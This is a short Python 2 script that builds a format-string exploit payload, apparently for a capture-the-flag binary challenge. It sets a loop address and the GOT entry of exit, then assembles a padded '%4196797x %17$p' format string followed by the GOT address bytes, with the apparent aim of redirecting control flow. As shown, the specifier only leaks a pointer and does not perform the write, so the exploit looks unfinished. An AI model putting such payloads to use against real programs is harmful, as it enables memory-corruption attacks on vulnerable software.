

LOOP_ADDR = "4009bd"
LOOP_ADDRE_DEC = 4196797
EXIT_GOT = "0000000000601258"

payload1 = "e".ljust(8)
payload1 += "%4196797x %17$p".rjust(16)
payload1 += EXIT_GOT.decode("hex")


print payload1